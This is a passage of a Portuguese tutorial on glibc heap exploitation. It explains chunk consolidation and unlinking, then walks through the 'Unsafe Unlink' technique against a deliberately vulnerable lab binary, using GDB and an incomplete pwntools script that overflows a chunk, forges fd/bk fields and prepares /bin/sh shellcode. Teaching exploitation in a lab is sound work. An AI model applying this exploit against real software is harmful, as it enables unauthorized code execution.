<p>Assim como nos <em>fastbins</em>, o endereço dos novos <em>chunks</em> liberados são adicionados no topo da <em>unsortedbin</em>, porém, diferente dos <em>fastbins</em>, novos <em>chunks</em> são adicionados no final da <em>unsortedbin</em>.</p>

<p>Reanalisando a imagem abaixo, vemos que liberar um <em>fast chunk</em> (<em>chunks</em> qualificados para o <em>fastbin</em>) não afeta os <em>chunks</em> ao redor, porém ele fez com que o <em>chunk</em> b não seja mais adjacente ao <em>top chunk</em>, o que o impede de ser consolidado ao <em>top chunk</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_175.png" alt="Estado atual da heap" /></p>

<p>Porém, ele é adjacente ao <em>chunk</em> a, que neste momento está livre. O próximo passo na execução do programa, é justamente liberar o <em>chunk</em> b novamente, podemos liberá-lo com o comando <code class="language-plaintext highlighter-rouge">next</code> e depois inspecionar a <em>heap</em> e o <em>unsortedbin</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_176.png" alt="Avançando a execução" /></p>

<p>Desta vez, os <em>chunks</em> a e b, foram consolidados em um mesmo <em>chunk</em> maior, seu <em>size field</em> agora corresponde a um <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x120</code> bytes de tamanho, a soma de dois <em>chunks</em> de <code class="language-plaintext highlighter-rouge">0x90</code> bytes.</p>

<p>Também podemos ver que a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> do <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x20</code> bytes foi retirada e adotou um <code class="language-plaintext highlighter-rouge">prev_size field</code> indicando que o <em>chunk</em> anterior tem o tamanho de <code class="language-plaintext highlighter-rouge">0x120</code> bytes.<br />
Também podemos ver na saída do comando <code class="language-plaintext highlighter-rouge">unsortedbin</code> que ainda existe somente um <em>chunk</em> no <em>unsortedbin</em>, este <em>chunk</em> maior.</p>

<blockquote>
  <p>Portanto, <em>chunks</em> livres adjacentes também são consolidados.<br />
Este processo pode parecer simples, mas vamos considerar o que a malloc precisa fazer para conseguir este resultado:</p>
  <ol>
    <li>Quando liberamos um <em>chunk</em>, a malloc precisa checar se qualquer <em>chunk</em> adjacente está disponível para consolidação. Ela faz isso utilizando a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code>.</li>
    <li>A malloc checa a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> do <em>chunk</em> que está sendo liberado para verificar se o <em>chunk</em> anterior também está livre.</li>
    <li>E para checar se o próximo <em>chunk</em> está livre, a malloc precisa olhar a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> de dois <em>chunks</em> seguintes para verificar se o <em>chunk</em> anterior a ele (o seguinte ao <em>chunk</em> ao que está sendo liberado) está livre.</li>
    <li>Uma vez que a malloc tenha estabelecido se o <em>chunk</em> anterior ou posterior, ou ambos sejam candidados à consolidação, ela precisa removê-los de qualquer lista que eles possam estar ligados, de outra forma, um <em>chunk</em> pode ser ligado em duas listas diferentes ao mesmo tempo.</li>
    <li>Então, a malloc precisa incrementar o espaço total ocupado pelo novo <em>chunk</em> maior e configurar o <em>size field</em> e o <code class="language-plaintext highlighter-rouge">prev_size field</code> de acordo com o resultado.</li>
    <li>Por fim, o novo <em>chunk</em> consolidado é ligado ao <em>unsortedbin</em>.</li>
  </ol>
</blockquote>

<p>O que mais nos interessa no processo de consolidação dos <em>chunks</em>, é a parte do <em>unlinking</em>, onde os <em>chunks</em> que estão sendo consolidados, são removidos de uma lista.</p>

<p>Um dos benefícios das listas duplamente ligadas, é a habilidade de remover facilmente um item do meio desta lista.</p>

<p>Se quisermos remover um item de uma lista simples, como a <em>fastbin</em>, precisamos iterar sobre esta lista eté encontrar o item precedente ao que desejamos remover, então, modificar seu “fd” para remover este item. Exemplo:</p>

<blockquote>
  <p>Se quisermos remover o item número 500 da uma lista <em>fastbin</em>, precisamos checar o “fd” dos 499 itens antes de encontrar o que precede o <em>chunk</em> que queremos remover.<br />
No entanto, na consolidação de <em>chunks</em> normais, a malloc pode facilmente remover um <em>chunk</em> do meio de uma lista, mesmo que esta seja imensa.</p>
</blockquote>

<p>Este processo será ilustrado de forma abstrata abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_177.png" alt="Processo de unlinking" /></p>

<p>Nesta situação, vamos imaginar que queremos remover o <em>chunk</em> <code class="language-plaintext highlighter-rouge">Victim</code> da <em>unsortedbin</em>. A primeira ação da malloc, é seguir a “fd” do <em>chunk</em> <code class="language-plaintext highlighter-rouge">Victim</code> para encontrar o próximo <em>chunk</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_178.png" alt="Seguindo o fd do chunk Victim" /></p>

<p>Ao encontrar o próximo <em>chunk</em>, a malloc sobrescreve seu “bk” com o mesmo valor do “bk” do <em>chunk</em> <code class="language-plaintext highlighter-rouge">Victim</code>, fazendo com que ele aponte para o <em>chunk</em> anterior ao <code class="language-plaintext highlighter-rouge">Victim</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_179.png" alt="Sobrescrevendo bk do chunk seguinte ao Victim" /></p>

<p>Neste momento, o <em>chunk</em> <code class="language-plaintext highlighter-rouge">Victim</code> já foi desvinculado da lista <em>backward</em>. Depois disso, a malloc segue o “bk” do <em>chunk</em> <code class="language-plaintext highlighter-rouge">Victim</code> para encontrar o <em>chunk</em> que o precede na lista.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_180.png" alt="Seguindo o bk do chunk Victim" /></p>

<p>Ao encontrar o <em>chunk</em> anterior, a malloc sobrescreve seu “fd” com o “fd” do <em>chunk</em> <code class="language-plaintext highlighter-rouge">Victim</code>, fazendo com que ele aponte para o <em>chunk</em> posterior ao <code class="language-plaintext highlighter-rouge">Victim</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_181.png" alt="Sobrescrevendo fd do chunk anterior ao Victim" /></p>

<p>Neste momento, o <em>chunk</em> <code class="language-plaintext highlighter-rouge">Victim</code> foi desvinculado de ambas as listas, <em>backward</em> e <em>forward</em>.</p>

<p>Em versões mais antigas da GLIBC, este processo de desvinculação é feito através de uma <code class="language-plaintext highlighter-rouge">macro</code>, sem nenhum tipo de verificação de integridade dos <em>pointers</em> “fd” e “bk”, sendo conhecido como <em>unsafe unlink</em>.</p>

<p>Se um atacante encontrar uma maneira de adulterar o “fd” e “bk” de um <em>chunk</em> que está sendo desvinculado, consequentemente ele conseguirá uma “escrita refletida”, fazendo com que este atacante possa selecionar dois endereços e escrevê-los um próximo ao outro na memória.</p>

<p>Antes de entendermos a abordagem da técnica de exploração do processo de <em>unlinking</em> em versões modernas da GLIBC, o que envolve um pouco mais de complexidade, vamos voltar para as versões anteriores ao ano de 2000, antes da implementação do <code class="language-plaintext highlighter-rouge">NX</code> (<em>No Execute</em>), quando o <em>unsafe unlik</em> foi criado originalmente.</p>

<h2 id="unsafe-unlink">Unsafe Unlink</h2>

<p>A técnica <code class="language-plaintext highlighter-rouge">Unsafe Unlink</code> é considerata a técnica original de exploração de <em>heap</em> na GLIBC. Desenvolvida no ano 2000 por <code class="language-plaintext highlighter-rouge">Alexander Peslyak, a.k.a. Solar Designer</code>, foi originalmente utilizada para explorar o navegador <code class="language-plaintext highlighter-rouge">Netscape</code> através de <em>heap overflow</em>. Posteriormente, esta técnica também foi utilizada para explorar o binário <code class="language-plaintext highlighter-rouge">sudo</code> no ano seguinte (a descrição da exploração se encontra no artigo “<em>Vudo Malloc Tricks</em>”).</p>

<blockquote>
  <p><code class="language-plaintext highlighter-rouge">Alexander Peslyak</code> não só foi o criador da primeira técnica de exploração de <em>heap</em>, como também criador da técnica de exploração de binários <code class="language-plaintext highlighter-rouge">ret2libc</code> em 1997 após a publicação “<em>Smashing the Stack for Fun and Profit</em>” de <code class="language-plaintext highlighter-rouge">AlephOne</code>.<br />
Alexander Peslyak também é um dos pais da técnica <code class="language-plaintext highlighter-rouge">Return-oriented progamming</code>, conhecida como <code class="language-plaintext highlighter-rouge">ROP</code>, e também criador da ferramenta de quebra de <em>hashes</em> <code class="language-plaintext highlighter-rouge">John the Ripper</code>.</p>
</blockquote>

<p>No diretódio <code class="language-plaintext highlighter-rouge">unsafe_unlink</code> do material de apoio, existe um binário com o mesmo nome. Podemos checar seus recursos de segurança que estão habilitados no binário com a ferramenta <code class="language-plaintext highlighter-rouge">checksec</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_182.png" alt="Checando os recursos de segurança" /></p>

<p>Diferente dos binários anteriores, podemos ver que o <code class="language-plaintext highlighter-rouge">NX</code> está desativado desta vez, pois estamos simulando um binário da década de 90 onde o <code class="language-plaintext highlighter-rouge">NX</code> ainda não havia sido implementado. Também podemos observar que este binário foi compilado com uma versão específica da GLIBC, <code class="language-plaintext highlighter-rouge">2.23</code> que também correesponde a uma versão da época.<br />
Podemos então carregar este binário no GDB e executá-lo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_183.png" alt="Executando o programa" /></p>

<p>Temos uma tela similar aos demais binários, onde encontramos o vazamento de um endereço da GLIBC, e um vazamento da <em>heap</em>, seguidos do menu de costume.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_184.png" alt="Opção 1" /></p>

<p>A opção um, nos permite alocar dois <em>chunks</em>, porém limitados aos chamados <em>small chunks</em>. O <em>chunk</em> considerado <em>small</em> precisa ter menos que <code class="language-plaintext highlighter-rouge">0x400</code> bytes de tamanho e também incluem os <em>chunks</em> de tamanho entre <code class="language-plaintext highlighter-rouge">0x20</code> e <code class="language-plaintext highlighter-rouge">0x80</code> dos <em>fastbins</em>. Neste caso, podemos alocar <em>small chunks</em> excluindo os tamanhos <em>fast</em>.</p>

<p>Ao solicitarmos um <em>chunk</em> com o menor tamanho permitido pelo binário, diferente dos demais, o programa não nos pede o <em>data</em> para preencher este <em>chunk</em>, pois a escrita dos dados acontece em uma opção diferente no menu.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_185.png" alt="Requisitando um chunk" /></p>

<p>A opção dois, nos permite escrever dados em nosso <em>chunk</em> o referenciando pelo índice, vamos preencher o <em>chunk</em> 0 com algum lixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_186.png" alt="Preenchendo o chunk" /></p>

<p>Agora podemos pausar o GDB e inspecionar a <em>heap</em>. Como podemos ver na imagem abaixo, alocamos um <em>chunk</em> com o tamanho de <code class="language-plaintext highlighter-rouge">0x90</code> bytes, cujo valor no <em>user data</em> foi preenchido com nosso lixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_187.png" alt="Heap" /></p>

<p>A opção três nos permite liberar um <em>chunk</em> de acordo com seu índice, porém, antes de liberá-lo, vamos solicitar mais um <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x90</code> bytes, para evitar que o primeiro <em>chunk</em> seja consolidado com o <em>top chunk</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_188.png" alt="Solicitando um chunk e liberando o anterior" /></p>

<p>Ao checar a <em>heap</em>, podemos ver as mesmas mudanças ocorridas no binário explorado anteriormente. A <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> (indicada em vermelho) foi retirada do segundo <em>chunk</em>, indicando que o chunk anterior não está mais em uso. O ultimo quadword do <em>user data</em> do nosso primeiro <em>chunk</em> agora pertence ao segundo <em>chunk</em> e foi reaproveitado como <code class="language-plaintext highlighter-rouge">prev_size field</code> contendo o tamanho do <em>chunk</em> (indicado em verde). Por último, o <em>chunk</em> que foi liberado foi ligado ao <em>unsortedbin</em>, e seus dois primeiros <em>quadwords</em> foram reaproveitados como “fd” e “bk” (indicado em azul).</p>

<p><img src="/img/papers/heap_p1/paper_heap1_189.png" alt="Análise da heap" /></p>

<p>Portanto, podemos solicitar até dois <em>chunks</em>, escrever dados neles quando quisermos e liberá-los quando quisermos.</p>

<p>Podemos verificar se este binário possui vulnerabilidade de <em>overflow</em> requisitando um <em>chunk</em> e escrevendo mais dados do que suporta.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_190.png" alt="Verificando overflow" /></p>

<p>Quando pausamos o programa no GDB e verificamos a <em>heap</em>, podemos verificar que não só preenchemos o <em>data field</em>, como sobrescrevemos o <em>top chunk size field</em>, mostrando que o binário é vulnerável a <em>overflow</em>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_191.png" alt="Vulnerável a overflow" /></p>

<p>Este binário possui uma vulnerabilidade similar o binário explorado na técnica <code class="language-plaintext highlighter-rouge">The house of Force</code>, no entanto, como não estamos trabalhando com os <em>fastbins</em>, podemos sobrescrever não só o <em>top chunk size field</em> como também os <em>size fields</em> pertencentes a outros <em>chunks</em>. Portanto, vamos solicitar mais um <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x90</code> bytes e inspecionar a <em>heap</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_192.png" alt="Heap" /></p>

<p>Como podemos observar, agora temos dois <em>chunks</em> de <code class="language-plaintext highlighter-rouge">0x90</code> bytes seguidos de um <em>top chunk size field</em> corrompido. Podemos editar o primeiro <em>chunk</em> novamente e enviar ainda mais dados para sobrescrever o <em>size field</em> do segundo <em>chunk</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_193.png" alt="Overflow" /></p>

<p>Pausando no GDB, podemos visualizar a <em>heap</em>, porém o comando <code class="language-plaintext highlighter-rouge">vis</code> não irá reconhecer o <em>top chunk size field</em> corrompido e não vai nos mostrar o que precisamos, para isso podemos utilizar o comando <code class="language-plaintext highlighter-rouge">dq</code>.<br />
A estrutura <code class="language-plaintext highlighter-rouge">mp_</code> é utilizada pela malloc, para armazenar uma pequena quantidade de parâmetros de metadados, e podemos utilizá-lo para inspecionar o parâmetro <code class="language-plaintext highlighter-rouge">sbrk_base</code> que contém o endereço inicial da <em>heap</em> e imprimir os próximos 38 <em>quadwords</em> de memória. Veremos mais sobre o <code class="language-plaintext highlighter-rouge">mp_</code> mais adiante.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_194.png" alt="Heap" /></p>

<p>Conforme podemos observar, o lixo enviado para o primeiro <em>chunk</em> sobrescreveu o <em>size field</em> do segundo <em>chunk</em>. Também podemos ver o <em>top chunk size field</em> corrompido no final do <em>user data</em> do segundo <em>chunk</em>.</p>

<blockquote>
  <p>Mesmo que neste caso conseguimos alterar o <em>top chunk size field</em> como fizemos na técnica <code class="language-plaintext highlighter-rouge">The house of Force</code>, não conseguimos utilizar esta técnica, pois somos limitados a solicitar apenas dois <em>chunks</em>.<br />
Porém, podemos imaginar como corromper o <em>size field</em> de um <em>chunk</em> normal pode nos beneficiar:<br />
Poderiamos alterar seu tamanho e liberá-lo, então teríamos que requisitá-lo novamente, porém não é possível graças a limitação de dois <em>chunks</em> imposta pelo binário. No entando, ao invés de trabalhar com o tamanho do <em>chunk</em>, poderíamos trabalhar com as <em>flags</em>.</p>
</blockquote>

<p>Sabendo que a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> é utilizada pela malloc para determinar se o <em>chunk</em> anterior é um candidato a consolidação, se conseguirmos remover a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> do segundo <em>chunk</em>, poderiamos indicar para malloc que quando liberarmos este segundo <em>chunk</em>, o primeiro seria um candidato a consolidação.</p>

<p>Também sabemos que o processo de consolidação envolve o processo de <em>unlinking</em> do primeiro <em>chunk</em>, mas este primeiro <em>chunk</em> não estará realmente livre, ou seja, não estaria ligado a nenhuma lista de <em>chunks</em> livres, portanto, não possui nenhum “fd” ou “bk”.</p>

<p>Esta seria uma oportunidade de fornecer um “fd” e um “bk” falsos, causando uma escrita refletida.</p>

<p>Para testarmos esta teoria, vamos criar o script base <code class="language-plaintext highlighter-rouge">code_execution.py</code> desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># configurando o binario e a GLIBC
</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"unsafe_unlink"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">runpath</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"/libc.so.6"</span><span class="p">)</span> 

<span class="c1"># GDB config
</span><span class="n">gs</span> <span class="o">=</span> <span class="s">'''
continue
'''</span>

<span class="c1"># funcao para iniciar
</span><span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gs</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>

<span class="c1"># indice do chunk alocado
</span><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>

<span class="c1"># seleciona a funcao "malloc", envia o tamanho e os dados e retorna o indice do chunk
</span><span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">index</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"size: "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="n">index</span> <span class="o">-</span> <span class="mi">1</span>

<span class="c1"># seleciona a funcao "edit" e envia os dados para o chunk.
</span><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"index: "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="c1"># seleciona a opcao "free" e envia o indice.
</span><span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"index: "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="c1"># capturando o endereco da puts() que o binario vaza
</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"puts() @ "</span><span class="p">)</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">puts</span>

<span class="c1"># capturando o endereco da heap que o binario vaza
</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"heap @ "</span><span class="p">)</span>
<span class="n">heap</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mf">0.1</span>

<span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># prepara o shellcode execve("/bin/sh") com um "jmp over" onde o fd sera escrito.
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"jmp shellcode;"</span> <span class="o">+</span> <span class="s">"shellcode:"</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">))</span>


<span class="c1"># =======================================#
</span>
<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
<p>Assim como nos scripts anteriores, este contém funções auxiliares que nos permitem enviar instruções através das oções do menu do binário para criar, editar e liberar <em>chunks</em>. Além destas, temos uma variável que gera um <em>shellcode</em> compilado com o módulo <code class="language-plaintext highlighter-rouge">shellcraft</code> do pwntools, esta variável gera um <em>data section</em> com a função <code class="language-plaintext highlighter-rouge">shellcode</code> em <code class="language-plaintext highlighter-rouge">Assembly</code>.</p>

<p>Vamos começar, reproduzindo no script, a mesma coisa que fizemos manualmente, vamos requisitar dois <em>chunks</em>, “A”e “B” de <code class="language-plaintext highlighter-rouge">0x90</code> bytes de tamanho, ficando desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># prepara o shellcode execve("/bin/sh") com um "jmp over" onde o fd sera escrito.
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"jmp shellcode;"</span> <span class="o">+</span> <span class="s">"shellcode:"</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">))</span>

<span class="c1"># requisitando 2 chunks
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>

<span class="c1"># =======================================#
</span></code></pre></div></div>
<p>Executando o script com as opções do GDB, podemos checar a heap.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_195.png" alt="Heap" /></p>

<p>Conforme esperado, temos dois <em>chunks</em> criados, ambos com a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> configurada. Agora podemos voltar ao editor do script, e inserir um <em>overflow</em> no <em>size field</em> do <em>chunk</em> B.</p>

<p>Neste caso, queremos manter o tamanho do <em>chunk</em>, porém alterar a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code>. Para isso, podemos chamar a função auxiliar <code class="language-plaintext highlighter-rouge">edit()</code> do nosso script e enviar <code class="language-plaintext highlighter-rouge">0x88</code> bytes de lixo, pois este é o tamanho do <em>chunk</em> que criamos. Depois, precisamos enviar o valor que vai sobrescrever o <em>size field</em> do segundo <em>chunk</em> que atualmente tem o valor de <code class="language-plaintext highlighter-rouge">0x91</code>, com o valor <code class="language-plaintext highlighter-rouge">0x90</code>, que irá manter o tamanho do <em>chunk</em>, porém remover a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code>. O bloco de exploração ficou da seguinte forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># prepara o shellcode execve("/bin/sh") com um "jmp over" onde o fd sera escrito.
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"jmp shellcode;"</span> <span class="o">+</span> <span class="s">"shellcode:"</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">))</span>

<span class="c1"># requisitando 2 chunks
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>

<span class="c1"># sobrescrevendo o size field do segundo chunk
</span><span class="n">edit</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x88</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">))</span>

<span class="c1"># =======================================#
</span></code></pre></div></div>

<p>Executando o script com as opções do GDB e inspecionando a heap, vemos que obtivemos sucesso conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_196.png" alt="Heap" /></p>

<p>O <em>chunk</em> B agora tem um <em>size field</em> com o valor de <code class="language-plaintext highlighter-rouge">0x90</code> e o ultimo quadword do <em>user data</em> do <em>chunk</em> A foi reaproveitado como <code class="language-plaintext highlighter-rouge">prev_size</code> do <em>chunk</em> B.</p>

<p>Portanto, se tentarmos liberar o <em>chunk</em> B agora, a malloc irá checar sua <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> e ver que está vazia e tentar consolidar o <em>chunk</em> B com o <em>chunk</em> A. Porém, para tentar encontrar o início do <em>chunk</em> A, a malloc precisa utilizar o <code class="language-plaintext highlighter-rouge">prev_size field</code> do <em>chunk</em> B, e neste momento, este campo está preenchido com lixo, então a malloc receberia o sinal <code class="language-plaintext highlighter-rouge">sigfault</code> ao tentar acessar este endereço menos <code class="language-plaintext highlighter-rouge">0x4141414141414141</code> bytes.</p>

<p>Portanto, vamos voltar ao script, e fazer mais algumas alterações.<br />
Vamos preparar algumas variáveis para facilitar a criação do script. Como teremos que forjar um par de “fd” e “bk” para nossa escrita refletida, vamos prepará-las com valores inválidos. também vamos criar um valor falso para campo <code class="language-plaintext highlighter-rouge">prev_size</code>, para guiar a malloc para o início real do <em>chunk</em> A, neste caso, este valor é <code class="language-plaintext highlighter-rouge">0x90</code>. Para facilitar o script, também vamos criar uma variável com o valor falso da <em>flag</em> <code class="language-plaintext highlighter-rouge">size_field</code> que também tem o valor de <code class="language-plaintext highlighter-rouge">0x90</code>.</p>

<p>Como já conhecemos a estrutura de um <em>chunk</em> normal e vamos forjar um <em>chunk</em> livre falso, sabemos que os dois primeiros <em>quadwords</em> do <em>user data</em> precisam conter os “fd” e o “bk” no <em>chunk</em> A seguido de lixo suficiente para preencher o <em>user data</em> até chegar ao campo <code class="language-plaintext highlighter-rouge">prev_size</code>. Podemos utilizar a função <code class="language-plaintext highlighter-rouge">p8()</code> do pwntools para imprimir caracteres nulos deixando o visual da heap mais compreensível. Então enviamos os <code class="language-plaintext highlighter-rouge">prev_size</code> e <code class="language-plaintext highlighter-rouge">size field</code> falsos. O bloco de exploração fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># prepara o shellcode execve("/bin/sh") com um "jmp over" onde o fd sera escrito.
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"jmp shellcode;"</span> <span class="o">+</span>  <span class="s">"shellcode:"</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">))</span>

<span class="c1"># requisitando 2 chunks
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>

<span class="c1"># criando variaveis
</span><span class="n">fd</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span>
<span class="n">bk</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span>
<span class="n">prev_size</span> <span class="o">=</span> <span class="mh">0x90</span>
<span class="n">fake_size</span> <span class="o">=</span> <span class="mh">0x90</span>

<span class="c1"># sobrescrevendo o size field do segundo chunk
